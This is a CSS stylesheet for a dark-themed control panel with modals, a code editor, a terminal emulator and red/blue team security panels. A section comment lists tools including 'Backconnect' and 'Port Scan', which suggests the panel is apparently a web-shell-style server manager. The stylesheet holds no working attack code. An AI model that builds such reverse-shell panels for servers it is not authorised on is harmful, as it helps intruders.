.m-lg { max-width: 920px } .m-full { width: 96vw; max-width: 1320px; height: 90vh }

.modal-head {
  display: flex; align-items: center; gap: 12px;
  padding: 14px 18px;
  border-bottom: 1px solid var(--bd2);
  flex-shrink: 0;
  background: linear-gradient(180deg, var(--ink1), var(--ink2));
  position: relative;
}
.modal-head::before {
  content: ""; position: absolute; left: 0; right: 0; bottom: -1px; height: 1px;
  background: linear-gradient(90deg, transparent, var(--jade-bd), transparent);
}
.modal-head h2 {
  font-size: 14px; font-weight: 600;
  flex: 1; letter-spacing: -.01em; color: var(--tx);
}
.path-tag {
  font-size: 10.5px; color: var(--jade);
  font-family: var(--mono); font-weight: 500;
  padding: 4px 10px;
  background: var(--ink3); border-radius: var(--r6);
  border: 1px solid var(--jade-bd);
  max-width: 280px;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.modal-body { padding: 20px; overflow: auto; flex: 1 }
.modal-foot {
  display: flex; align-items: center; justify-content: flex-end; gap: 10px;
  padding: 13px 18px;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, transparent, rgba(0,0,0,.15));
  flex-shrink: 0;
}
.modal-foot .left { flex: 1; font-size: 11px; color: var(--tx3); font-family: var(--mono) }

/* ─── FORMS ───────────────────────────────────────────────────── */
.fg { margin-bottom: 16px }
.fg label {
  display: block; font-size: 10.5px; font-weight: 700;
  color: var(--tx3); text-transform: uppercase; letter-spacing: .1em;
  margin-bottom: 7px;
}
.fg input, .fg textarea, .fg select {
  width: 100%; padding: 10px 12px;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r8); outline: none;
  color: var(--tx); font-size: 13.5px;
  transition: border-color .15s var(--ease), box-shadow .15s var(--ease), background-color .15s var(--ease);
}
.fg input:hover:not(:focus), .fg textarea:hover:not(:focus), .fg select:hover:not(:focus) { background: var(--ink4); border-color: var(--bd) }
.fg input:focus, .fg textarea:focus, .fg select:focus {
  border-color: var(--jade-bd2);
  box-shadow: var(--s-jade-soft);
  background: var(--ink3);
}
.fg textarea {
  font-family: var(--mono); font-size: 13px;
  resize: vertical; min-height: 90px; line-height: 1.7;
}

/* ─── CODE EDITOR ─────────────────────────────────────────────── */
.editor-wrap {
  display: flex; flex: 1; overflow: hidden;
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  background: var(--ink0);
  min-height: 480px;
  box-shadow: inset 0 1px 2px rgba(0,0,0,.4);
}
.line-nums {
  padding: 18px 0;
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  border-right: 1px solid var(--bd2);
  font-family: var(--mono); font-size: 13px; line-height: 1.75;
  color: var(--tx4); text-align: right;
  user-select: none; overflow: hidden;
  min-width: 56px; flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.line-nums div { padding: 0 12px }
.ed-area { flex: 1; position: relative; overflow: hidden }
.ed-area .ed-highlight,
.ed-area textarea {
  position: absolute; inset: 0; width: 100%; height: 100%;
  margin: 0;
  padding: 18px 20px;
  font-family: var(--mono); font-size: 13px; line-height: 1.75;
  tab-size: 4;
  white-space: pre;
  word-wrap: normal;
  overflow: auto;
  border: none;
  border-radius: 0;
}
.ed-area .ed-highlight {
  pointer-events: none;
  z-index: 1;
  color: var(--tx);
  overflow: hidden;
}
.ed-area textarea {
  z-index: 2;
  background: transparent;
  outline: none;
  resize: none;
  color: transparent;
  caret-color: var(--jade);
  -webkit-text-fill-color: transparent;
}
.ed-area textarea::selection { background: rgba(245,185,66,.30); color: transparent }
.ed-area textarea::-moz-selection { background: rgba(245,185,66,.30); color: transparent }
.ed-area.no-highlight textarea {
  color: var(--tx);
  -webkit-text-fill-color: var(--tx);
}
.ed-area.no-highlight .ed-highlight { display: none }

/* ─── SYNTAX TOKEN COLORS — Noir Gold palette ────────────────── */
.tk-com { color: #6e6a5e; font-style: italic }
.tk-str { color: #c4d196 }
.tk-num { color: #f5b942 }
.tk-key { color: #ff8c70 }
.tk-fn  { color: #e0bcff }
.tk-var { color: #ffa657 }
.tk-tag { color: #b8d986 }
.tk-att { color: #d4961f }
.tk-cls { color: #ffa657 }
.tk-pun { color: var(--tx2) }
.tk-bool{ color: #f5b942; font-weight: 600 }
.tk-op  { color: #ff8c70 }
.tk-md-h{ color: #f5b942; font-weight: 700 }
.tk-md-em{ color: #e0bcff; font-style: italic }
.tk-md-cd{ color: #c4d196 }
.tk-md-li{ color: #ff8c70 }

/* ─── IMAGE PREVIEW MODAL ─────────────────────────────────────── */
.ip-tabs {
  display: flex; gap: 2px;
  background: var(--ink3);
  border: 1px solid var(--bd2);
  border-radius: var(--r8);
  padding: 3px;
}
.ip-tab {
  padding: 5px 14px; font-size: 12px; font-weight: 500;
  color: var(--tx3); background: transparent;
  border: none; border-radius: var(--r6);
  cursor: pointer;
  transition: color .15s var(--ease), background-color .15s var(--ease);
}
.ip-tab:hover:not(.active) { background: var(--ink4); color: var(--tx2) }
.ip-tab.active {
  background: linear-gradient(180deg, var(--ink4), var(--ink3));
  color: var(--jade);
  box-shadow: 0 1px 0 rgba(255,255,255,.04) inset;
}

.ip-pane {
  display: flex; flex-direction: column;
  align-items: center; justify-content: center;
  min-height: 360px;
  background:
    repeating-conic-gradient(var(--ink2) 0% 25%, var(--ink1) 0% 50%) 50% / 24px 24px;
  border: 1px solid var(--bd2);
  border-radius: var(--r12);
  padding: 16px;
  position: relative;
}
.ip-image img {
  max-width: 100%;
  max-height: 70vh;
  object-fit: contain;
  border-radius: var(--r8);
  box-shadow: var(--s2);
  background: #000;
}
.ip-image .img-info {
  position: absolute; left: 14px; bottom: 14px;
  font-family: var(--mono); font-size: 11px;
  background: rgba(0,0,0,.65);
  border: 1px solid var(--bd2);
  border-radius: var(--r6);
  padding: 4px 10px;
  color: var(--tx2);
}
.ip-text {
  background: var(--ink0);
  align-items: stretch; justify-content: stretch;
  padding: 0;
  min-height: 360px;
}
.ip-text pre {
  flex: 1;
  margin: 0; padding: 16px 18px;
  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
  color: var(--tx2);
  white-space: pre-wrap; word-break: break-all;
  overflow: auto;
  max-height: 70vh;
}
.ip-text pre.hex-mode {
  white-space: pre; word-break: normal;
}

/* ─── TOOLS (Cron, Backconnect, Port Scan, DB) ──────────────── */
.tool-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px }
.tool-grid .fg { margin-bottom: 0 }
.tool-grid .span2 { grid-column: 1 / -1 }
@media (max-width: 640px) { .tool-grid { grid-template-columns: 1fr } }
.tool-output {
  margin-top: 14px; padding: 12px 14px;
  background: var(--ink0); border: 1px solid var(--bd2);
  border-radius: var(--r10); font-family: var(--mono);
  font-size: 12px; line-height: 1.65; color: var(--tx2);
  max-height: 280px; overflow: auto; white-space: pre-wrap;
}
.tool-output.empty { color: var(--tx4); font-style: italic }
.tool-output.tall { max-height: 420px; min-height: 180px }
.tool-output.fw-results { white-space: normal }
.fw-meta { color: var(--tx3); margin-bottom: 6px; white-space: pre-wrap }
.fw-row { display: flex; gap: 8px; align-items: flex-start; padding: 2px 0; border-bottom: 1px solid transparent }
.fw-row:hover { background: rgba(255,255,255,.03) }
.fw-perm {
  flex: 0 0 auto; color: var(--jade); font-weight: 600;
  min-width: 3.2em;
}
.fw-link {
  color: var(--tx1); text-decoration: none; word-break: break-all;
  cursor: pointer; border-bottom: 1px dashed rgba(255,255,255,.18);
}
.fw-link:hover { color: var(--jade); border-bottom-color: var(--jade) }
.tool-cmd {
  font-family: var(--mono); font-size: 11px; color: var(--jade);
  padding: 8px 10px; margin-bottom: 10px;
  background: var(--ink0); border: 1px solid var(--jade-bd);
  border-radius: var(--r8); word-break: break-all; line-height: 1.5;
}
.tool-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px }
.tool-tag {
  font-family: var(--mono); font-size: 11px; font-weight: 600;
  padding: 4px 10px; border-radius: 999px;
  background: var(--jade-bg); border: 1px solid var(--jade-bd);
  color: var(--jade-hi);
}
.tool-tag.closed {
  background: var(--red-bg); border-color: var(--red-bd); color: var(--red);
}
.db-result-wrap { overflow: auto; max-height: 340px; margin-top: 12px; border: 1px solid var(--bd2); border-radius: var(--r10) }
.db-result-wrap table { width: 100%; border-collapse: collapse; font-size: 12px }
.db-result-wrap th, .db-result-wrap td {
  padding: 7px 10px; text-align: left; border-bottom: 1px solid var(--bd2);
  font-family: var(--mono); white-space: nowrap; max-width: 220px;
  overflow: hidden; text-overflow: ellipsis;
}
.db-result-wrap th { background: var(--ink3); color: var(--jade); font-weight: 600; position: sticky; top: 0 }
.db-result-wrap tr:hover td { background: rgba(245,185,66,.04) }
.db-tables { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px }
.db-table-chip {
  font-family: var(--mono); font-size: 11px; padding: 4px 9px;
  border-radius: var(--r6); background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx2); cursor: pointer; transition: all .15s var(--ease);
}
.db-table-chip:hover { border-color: var(--jade-bd); color: var(--jade) }
.tool-note { font-size: 11px; color: var(--tx4); margin-top: 8px; line-height: 1.5 }
.tool-note code {
  font-family: var(--mono); font-size: 10.5px; padding: 1px 6px;
  background: var(--ink3); border: 1px solid var(--bd2); border-radius: 4px; color: var(--jade);
}

/* ─── SECURITY HUBS & TOOL MODALS ─────────────────────────────── */
.tool-modal .modal-body { padding: 20px 22px }
.tool-modal .modal-head h2 { display: flex; align-items: center; gap: 10px }
.tool-modal .modal-head .tool-head-ico {
  width: 32px; height: 32px; display: grid; place-items: center;
  border-radius: var(--r8); background: var(--jade-bg); border: 1px solid var(--jade-bd);
  font-size: 16px; flex-shrink: 0;
}

.sec-callout {
  display: flex; gap: 10px; align-items: flex-start;
  padding: 10px 12px; margin: 12px 0 0;
  background: rgba(245,185,66,.04);
  border: 1px solid var(--jade-bd);
  border-left: 3px solid var(--jade);
  border-radius: 0 var(--r8) var(--r8) 0;
  font-size: 11.5px; color: var(--tx3); line-height: 1.55;
}
.sec-callout.blue {
  background: var(--blue-bg);
  border-color: rgba(121,192,255,.22);
  border-left-color: var(--blue);
}
.sec-callout.warn {
  background: var(--amber-bg);
  border-color: rgba(212,150,31,.25);
  border-left-color: var(--amber);
}
.sec-callout svg { width: 16px; height: 16px; flex-shrink: 0; margin-top: 1px; stroke: var(--jade); fill: none; stroke-width: 2 }
.sec-callout.warn svg { stroke: var(--amber) }
.sec-callout code {
  font-family: var(--mono); font-size: 10.5px; padding: 1px 5px;
  background: rgba(0,0,0,.25); border-radius: 3px; color: var(--jade-hi);
}
.sec-callout.blue code { color: var(--blue) }
.tool-modal.blue-team .tool-head-ico {
  background: var(--blue-bg); border-color: rgba(121,192,255,.28);
}

.sec-hub-modal .modal-head.sec-hub-head {
  padding: 14px 18px;
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border-bottom: 1px solid var(--bd2);
}
.sec-hub-head-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0 }
.sec-hub-head-left h2 { font-size: 16px; font-weight: 700; letter-spacing: -.02em }
.sec-hub-badge {
  font-family: var(--mono); font-size: 9px; font-weight: 800; letter-spacing: .14em;
  padding: 4px 8px; border-radius: 6px; flex-shrink: 0;
  background: var(--jade-bg); border: 1px solid var(--jade-bd); color: var(--jade);
}
.sec-hub-modal.blue-team .sec-hub-badge {
  background: var(--blue-bg); border-color: rgba(121,192,255,.28); color: var(--blue);
}
.sec-hub-body { padding: 0 !important; display: flex; flex-direction: column; min-height: 0; flex: 1 }

.sec-hub-shell {
  display: flex; flex: 1; min-height: 0; overflow: hidden;
}
.sec-hub-nav {
  width: 210px; flex-shrink: 0;
  border-right: 1px solid var(--bd2);
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  overflow-y: auto; padding: 10px 8px;
  scrollbar-width: thin;
}
.sec-nav-btn {
  display: flex; align-items: center; gap: 10px; width: 100%;
  padding: 9px 10px; margin-bottom: 3px;
  border: 1px solid transparent; border-radius: var(--r10);
  background: transparent; cursor: pointer; text-align: left;
  transition: all .15s var(--ease);
}
.sec-nav-btn:hover {
  background: var(--ink3); border-color: var(--bd2);
}
.sec-nav-btn.active {
  background: linear-gradient(135deg, rgba(245,185,66,.12), rgba(245,185,66,.04));
  border-color: var(--jade-bd);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.04);
}
.sec-hub-modal.blue-team .sec-nav-btn.active {
  background: linear-gradient(135deg, rgba(121,192,255,.14), rgba(121,192,255,.04));
  border-color: rgba(121,192,255,.28);
}
.sec-nav-ico {
  width: 30px; height: 30px; flex-shrink: 0;
  display: grid; place-items: center;
  border-radius: var(--r8);
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx3);
  transition: all .15s var(--ease);
}
.sec-nav-ico svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round }
.sec-nav-btn.active .sec-nav-ico {
  background: var(--jade-bg); border-color: var(--jade-bd); color: var(--jade);
}
.sec-hub-modal.blue-team .sec-nav-btn.active .sec-nav-ico {
  background: var(--blue-bg); border-color: rgba(121,192,255,.3); color: var(--blue);
}
.sec-nav-text { display: flex; flex-direction: column; gap: 1px; min-width: 0 }
.sec-nav-text strong { font-size: 12px; font-weight: 600; color: var(--tx2); line-height: 1.2 }
.sec-nav-text small { font-size: 10px; color: var(--tx4); line-height: 1.2 }
.sec-nav-btn.active .sec-nav-text strong { color: var(--tx) }

.sec-hub-main { flex: 1; min-width: 0; display: flex; flex-direction: column; overflow: hidden }
.sec-hero {
  padding: 18px 22px 16px;
  background:
    radial-gradient(ellipse 80% 120% at 100% 0%, rgba(245,185,66,.08), transparent 55%),
    linear-gradient(180deg, var(--ink2), var(--ink1));
  border-bottom: 1px solid var(--bd2);
  flex-shrink: 0;
}
.sec-hub-modal.blue-team .sec-hero {
  background:
    radial-gradient(ellipse 80% 120% at 100% 0%, rgba(121,192,255,.10), transparent 55%),
    linear-gradient(180deg, var(--ink2), var(--ink1));
}
.sec-hero h3 {
  font-size: 15px; font-weight: 700; color: var(--tx);
  margin: 0 0 4px; letter-spacing: -.02em;
}
.sec-hero p { font-size: 12px; color: var(--tx3); margin: 0; line-height: 1.5; max-width: 640px }
.sec-hub-content { padding: 18px 22px 22px; overflow: auto; flex: 1 }

.sec-panel { display: none; animation: secFadeIn .2s var(--ease) }
.sec-panel.active { display: block }
@keyframes secFadeIn { from { opacity: 0; transform: translateY(4px) } to { opacity: 1; transform: none } }

.sec-panel-card {
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border: 1px solid var(--bd2);
  border-radius: var(--r14);
  padding: 16px 18px;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.03);
}
.sec-panel-card + .sec-panel-card { margin-top: 14px }

.sec-actions {
  display: flex; gap: 8px; flex-wrap: wrap;
  margin-bottom: 14px; align-items: center;
}
.sec-actions .btn-sm { font-size: 11px; padding: 7px 13px; border-radius: var(--r8) }
.sec-actions-divider {
  width: 1px; height: 22px; background: var(--bd2); margin: 0 2px;
}

.sec-form-grid {
  display: grid; grid-template-columns: 1fr 1fr; gap: 12px 14px; margin-bottom: 14px;
}
.sec-form-grid .fg { margin-bottom: 0 }
.sec-form-grid .span2 { grid-column: 1 / -1 }
@media (max-width: 720px) {
  .sec-hub-shell { flex-direction: column; min-height: 0 }
  .sec-hub-nav {
    width: 100%; border-right: none; border-bottom: 1px solid var(--bd2);
    display: flex; flex-wrap: nowrap; overflow-x: auto; padding: 8px;
  }
  .sec-nav-btn { width: auto; flex-shrink: 0; min-width: 130px }
  .sec-nav-text small { display: none }
  .sec-form-grid { grid-template-columns: 1fr }
}

.sec-toggle-row {
  display: flex; align-items: center; gap: 10px; padding: 10px 12px;
  background: var(--ink0); border: 1px solid var(--bd2); border-radius: var(--r10);
  cursor: pointer; user-select: none; transition: border-color .15s;
}
.sec-toggle-row:hover { border-color: var(--jade-bd) }
.sec-toggle-row input { width: auto; accent-color: var(--jade); flex-shrink: 0 }
.sec-toggle-row span { font-size: 12px; color: var(--tx2); line-height: 1.4 }

.sec-terminal {
  border: 1px solid var(--bd2); border-radius: var(--r12);
  overflow: hidden; background: var(--ink0);
  box-shadow: inset 0 2px 12px rgba(0,0,0,.25);
}
.sec-terminal-bar {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px;
  background: linear-gradient(180deg, var(--ink3), var(--ink2));
  border-bottom: 1px solid var(--bd2);
}
.sec-terminal-dots { display: flex; gap: 5px }
.sec-terminal-dots i {
  width: 9px; height: 9px; border-radius: 50%; display: block;
}
.sec-terminal-dots i:nth-child(1) { background: #ff5f57 }
.sec-terminal-dots i:nth-child(2) { background: #febc2e }
.sec-terminal-dots i:nth-child(3) { background: #28c840 }
.sec-terminal-title {
  font-family: var(--mono); font-size: 10.5px; color: var(--tx4);
  letter-spacing: .04em; text-transform: uppercase;
}
.sec-terminal-out {
  margin: 0 !important; border: none !important; border-radius: 0 !important;
  max-height: 360px; min-height: 200px;
  background: #040506;
}
.sec-panel .sec-terminal-out.tall { max-height: 380px; min-height: 220px }

.sec-quarantine-card {
  margin-top: 16px; padding-top: 16px;
  border-top: 1px dashed var(--bd2);
}
.sec-quarantine-head {
  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
  margin-bottom: 10px;
}
.sec-quarantine-head .sec-q-title {
  display: flex; align-items: center; gap: 8px;
  font-size: 12px; font-weight: 700; color: var(--tx2);
  flex: 1; min-width: 140px;
}
.sec-quarantine-head .sec-q-title svg {
  width: 16px; height: 16px; stroke: var(--blue); fill: none; stroke-width: 2;
}

.sec-tabs {
  padding: 10px 14px 0;
  border-bottom: 1px solid var(--bd2);
  background: var(--ink1);
  flex-wrap: wrap;
  gap: 4px;
}
.sec-panel .tool-output:not(.sec-terminal-out) { max-height: 360px; min-height: 200px }

.blue-badge {
  display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 8px;
  border-radius: 999px; margin-right: 6px; font-family: var(--mono);
}
.blue-badge.critical { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-bd) }
.blue-badge.high { background: var(--amber-bg); color: var(--amber); border: 1px solid rgba(212,150,31,.3) }
.blue-badge.ok { background: var(--jade-bg); color: var(--jade); border: 1px solid var(--jade-bd) }

.blue-threat-wrap {
  margin-top: 12px; border: 1px solid var(--bd2); border-radius: var(--r12);
  background: var(--ink0); max-height: 340px; overflow: auto;
  box-shadow: inset 0 2px 8px rgba(0,0,0,.2);
}
.blue-threat-item {
  display: flex; gap: 10px; align-items: flex-start; padding: 11px 14px;
  border-bottom: 1px solid var(--bd2); font-size: 12px;
  transition: background .12s var(--ease);
  position: relative;
}
.blue-threat-item::before {
  content: ""; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
  background: transparent; transition: background .12s;
}
.blue-threat-item:has(.blue-threat-sev.CRITICAL)::before { background: var(--red) }
.blue-threat-item:has(.blue-threat-sev.HIGH)::before { background: var(--amber) }
.blue-threat-item:has(.blue-threat-sev.MEDIUM)::before { background: var(--blue) }
.blue-threat-item:last-child { border-bottom: none }
.blue-threat-item:hover { background: rgba(245,185,66,.03) }
.blue-threat-item input { margin-top: 4px; flex-shrink: 0; accent-color: var(--jade); width: 15px; height: 15px }
.blue-threat-info { flex: 1; min-width: 0 }
.blue-threat-path {
  font-family: var(--mono); font-size: 11.5px; color: var(--tx);
  word-break: break-all; line-height: 1.45;
}
.blue-threat-meta { font-size: 10.5px; color: var(--tx4); margin-top: 4px; line-height: 1.5 }
.blue-threat-sev {
  font-family: var(--mono); font-size: 9.5px; font-weight: 800; letter-spacing: .04em;
  padding: 3px 8px; border-radius: 6px; flex-shrink: 0; margin-top: 1px;
}
.blue-threat-sev.CRITICAL { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-bd) }
.blue-threat-sev.HIGH { background: var(--amber-bg); color: var(--amber); border: 1px solid rgba(212,150,31,.3) }
.blue-threat-sev.MEDIUM { background: rgba(121,192,255,.12); color: var(--blue); border: 1px solid rgba(121,192,255,.22) }
.blue-threat-sev.LOW { background: var(--ink4); color: var(--tx3); border: 1px solid var(--bd2) }
.blue-threat-actions {
  display: none; flex-wrap: wrap; gap: 8px; margin-top: 14px; align-items: center;
  padding: 10px 12px; background: var(--ink2); border: 1px solid var(--bd2);
  border-radius: var(--r10);
}
.blue-threat-actions.show { display: flex }
.blue-threat-actions .btn-danger { background: var(--red-bg); border-color: var(--red-bd); color: var(--red) }
.blue-threat-actions .btn-danger:hover { background: rgba(248,113,113,.2) }
.blue-threat-count-pill {
  font-family: var(--mono); font-size: 11px; font-weight: 700;
  padding: 4px 10px; border-radius: 999px;
  background: var(--red-bg); border: 1px solid var(--red-bd); color: var(--red);
  margin-right: auto;
}

.sec-hub-foot {
  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
}
.sec-hub-foot .sec-stat {
  font-family: var(--mono); font-size: 10px; color: var(--tx4);
  padding: 3px 8px; border-radius: 6px;
  background: var(--ink3); border: 1px solid var(--bd2);
}
.sec-hub-foot .left { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; flex: 1 }

/* ─── TERMINAL — Premium Warp/iTerm-inspired ─────────────────── */
.term-modal .modal-body {
  padding: 0; display: flex; flex-direction: column;
  background: var(--ink0);
  position: relative;
  overflow: hidden;
}
.term-modal .modal-body::before {
  content: "";
  position: absolute; inset: 0;
  background: repeating-linear-gradient(
    0deg,
    transparent 0,
    transparent 2px,
    rgba(245,185,66,.012) 3px,
    transparent 4px
  );
  pointer-events: none; opacity: .45;
  z-index: 0;
}

.term-top {
  display: flex; align-items: center; gap: 14px;
  padding: 11px 18px;
  background: linear-gradient(180deg, var(--ink2), var(--ink1));
  border-bottom: 1px solid var(--bd2);
  box-shadow: inset 0 -1px 0 rgba(245,185,66,.05);
  flex-shrink: 0;
  position: relative; z-index: 2;
}
.term-dots { display: flex; gap: 7px }
.term-dots i {
  width: 12px; height: 12px; border-radius: 50%;
  display: block;
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,.28),
    0 1px 2px rgba(0,0,0,.4);
  transition: opacity .2s var(--ease), transform .2s var(--ease);
}
.term-dots i:nth-child(1) { background: linear-gradient(135deg, #ff7a6e, #ff5f57) }
.term-dots i:nth-child(2) { background: linear-gradient(135deg, #ffd13b, #febc2e) }
.term-dots i:nth-child(3) { background: linear-gradient(135deg, #4cd964, #28c840) }
.term-dots:hover i { opacity: .85 }

.term-title-area {
  flex: 1; display: flex; flex-direction: column; gap: 2px;
  align-items: center; min-width: 0;
}
.term-title {
  font-size: 11px; font-weight: 700;
  color: var(--tx2); letter-spacing: .14em;
  text-transform: uppercase;
  display: flex; align-items: center; gap: 7px;
}
.term-title-icon {
  width: 12px; height: 12px;
  stroke: var(--jade); fill: none;
  filter: drop-shadow(0 0 4px rgba(245,185,66,.4));
}
.term-cwd {
  font-family: var(--mono); font-size: 10.5px;
  color: var(--tx4); font-weight: 500;
  max-width: 60ch;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  letter-spacing: .02em;
}

.term-actions { display: flex; gap: 5px; align-items: center }
.term-stats {
  font-family: var(--mono); font-size: 10px;
  color: var(--tx4); font-weight: 500;
  padding: 3px 9px; border-radius: 4px;
  background: var(--ink3); border: 1px solid var(--bd2);
  display: flex; align-items: center; gap: 4px;
}
.term-stats b { color: var(--jade); font-weight: 700; font-variant-numeric: tabular-nums }
.term-actions .term-btn {
  width: 28px; height: 28px;
  border-radius: 6px;
  background: transparent; border: 1px solid transparent;
  color: var(--tx3); cursor: pointer;
  display: grid; place-items: center;
  transition: all .15s var(--ease);
}
.term-actions .term-btn:hover {
  background: var(--ink3);
  color: var(--jade);
  border-color: var(--bd2);
}
.term-actions .term-btn svg { width: 13px; height: 13px; fill: currentColor }

/* Output area */
.term-out {
  flex: 1; overflow-y: auto;
  padding: 18px 22px 14px;
  font-family: var(--mono); font-size: 12.5px; line-height: 1.7;
  color: var(--tx2);
  position: relative; z-index: 1;
  scroll-behavior: smooth;
  background:
    radial-gradient(ellipse 700px 350px at 50% 0%, rgba(245,185,66,.022) 0%, transparent 70%);
}

/* Welcome banner */
.term-banner {
  margin: 0 0 18px 0;
  padding: 14px 16px;
  background: linear-gradient(135deg, rgba(245,185,66,.06), rgba(245,185,66,.02));
  border: 1px solid var(--jade-bd);
  border-left: 3px solid var(--jade);
  border-radius: 8px;
  font-family: var(--mono); font-size: 11.5px;
  color: var(--tx2); line-height: 1.65;
}
.term-banner b {
  color: var(--jade); font-weight: 700;
  letter-spacing: .04em;
  display: block; margin-bottom: 4px;
  font-size: 12px;
}
.term-banner .kbd {
  font-family: var(--mono); font-size: 10.5px;
  padding: 1px 6px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx); font-weight: 600;
  margin: 0 2px;
}

/* Block-style output (each command gets its own card) */
.term-block {
  margin-bottom: 16px;
  padding-left: 14px;
  border-left: 2px solid var(--bd2);
  position: relative;
  animation: tblockIn .22s var(--ease-out);
}
@keyframes tblockIn {
  from { opacity: 0; transform: translateX(-4px) }
  to   { opacity: 1; transform: translateX(0) }
}
.term-block.success { border-left-color: var(--jade-bd2) }
.term-block.error   { border-left-color: rgba(248,113,113,.55) }
.term-block.running { border-left-color: var(--jade) }
.term-block.running::before {
  content: ""; position: absolute;
  left: -2px; top: 0; bottom: 0; width: 2px;
  background: var(--jade);
  animation: tblockPulse 1.2s var(--ease) infinite;
}
@keyframes tblockPulse {
  0%, 100% { opacity: 1 }
  50%      { opacity: .35 }
}

.term-cmd-line {
  display: flex; align-items: center; gap: 10px;
  padding: 4px 0 8px;
  font-weight: 500;
}
.term-prompt-mini {
  color: var(--jade); font-weight: 800;
  font-size: 13px; flex-shrink: 0;
  text-shadow: 0 0 8px rgba(245,185,66,.5);
}
.term-cmd-text {
  flex: 1; color: var(--tx);
  white-space: pre-wrap; word-break: break-all;
  font-weight: 500;
}
.term-cmd-meta {
  display: flex; gap: 6px; align-items: center;
  font-size: 10px; color: var(--tx4);
  font-weight: 500; flex-shrink: 0;
  font-variant-numeric: tabular-nums;
}
.term-time { opacity: .65 }
.term-duration {
  padding: 1px 7px; border-radius: 3px;
  background: var(--ink3); border: 1px solid var(--bd2);
  color: var(--tx3); letter-spacing: .02em;
}
.term-block.success .term-duration { color: var(--jade); border-color: var(--jade-bd) }
.term-block.error .term-duration { color: var(--red); border-color: rgba(248,113,113,.3) }

.term-out-text {
  white-space: pre-wrap; word-break: break-word;
  padding: 2px 0;
  color: var(--tx2);
  font-size: 12.5px;
  line-height: 1.7;
}
.term-block.error .term-out-text { color: #ffb3b3 }
.term-block.dim  .term-out-text { color: var(--tx4); font-style: italic }
.term-exit-note {
  display: inline-flex; align-items: center; gap: 6px;
  margin-top: 6px; padding: 2px 9px;
  font-size: 10.5px; font-weight: 600;
  background: rgba(248,113,113,.1);
  border: 1px solid rgba(248,113,113,.25);
  border-radius: 4px;
  color: var(--red);
}

/* Animated running dots */
.term-running-dots {
  display: inline-flex; gap: 5px;
  padding: 6px 0; align-items: center;
}
.term-running-dots span {
  width: 5px; height: 5px; border-radius: 50%;
  background: var(--jade);
  animation: trd 1.2s var(--ease) infinite;
}
.term-running-dots span:nth-child(2) { animation-delay: .15s }
.term-running-dots span:nth-child(3) { animation-delay: .3s }
@keyframes trd {
  0%, 100% { opacity: .3; transform: scale(.8) }
  50%      { opacity: 1; transform: scale(1) }
}

/* Legacy line for system/dim messages */
.term-line { margin-bottom: 2px; animation: tline .12s var(--ease) }
@keyframes tline { from{opacity:0; transform: translateY(-2px)} to{opacity:1; transform: translateY(0)} }
.term-line.cmd { color: var(--jade); font-weight: 500 }
.term-line.err { color: var(--red) }
.term-line.dim { color: var(--tx4); font-style: italic }

/* Input row — premium prompt segments */
.term-in-row {
  display: flex; align-items: center; gap: 12px;
  padding: 13px 22px;
  border-top: 1px solid var(--bd2);
  background: linear-gradient(180deg, var(--ink1), var(--ink0));
  flex-shrink: 0;
  position: relative; z-index: 2;
  transition: box-shadow .25s var(--ease);
}
.term-in-row::before {
  content: ""; position: absolute;
  left: 0; right: 0; top: 0; height: 1px;
  background: linear-gradient(90deg, transparent, var(--jade-bd), transparent);
  transition: background .25s var(--ease);
}
.term-in-row:focus-within {
  box-shadow: 0 -8px 24px rgba(245,185,66,.06);
}
.term-in-row:focus-within::before {
  background: linear-gradient(90deg, transparent, var(--jade), transparent);
}

.term-prompt-area {
  display: flex; align-items: baseline; gap: 0;
  font-family: var(--mono); font-size: 12px;
  flex-shrink: 0;
  letter-spacing: .01em;
}
.term-prompt-user { color: var(--jade); font-weight: 700 }
.term-prompt-at   { color: var(--tx4); margin: 0 1px }
.term-prompt-host { color: var(--jade-hi); font-weight: 600 }
.term-prompt-colon{ color: var(--tx4); margin: 0 1px }
.term-prompt-cwd {
  color: #79c0ff; font-weight: 500;
  max-width: 28ch;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
.term-prompt-mark {
  color: var(--jade); font-weight: 800;
  font-size: 14px; line-height: 1;
  margin-left: 7px;
  text-shadow: 0 0 8px rgba(245,185,66,.55);
}

.term-in-row input {
  flex: 1; background: transparent; border: none; outline: none;
  font-family: var(--mono); font-size: 13px; color: var(--tx);
  caret-color: var(--jade);
  letter-spacing: .015em;
  min-width: 0;
}
.term-in-row input::placeholder {
  color: var(--tx4); font-style: italic; opacity: .7;
}

.term-spinner {
  display: none; flex-shrink: 0;
  width: 14px; height: 14px;
  border: 2px solid var(--jade-bd);
  border-top-color: var(--jade);
  border-radius: 50%;
  animation: tspin .7s linear infinite;
}
.term-spinner.show { display: inline-block }
@keyframes tspin { to { transform: rotate(360deg) } }

.term-hint {
  font-family: var(--mono); font-size: 9.5px;
  color: var(--tx4);
  display: flex; gap: 10px; align-items: center;
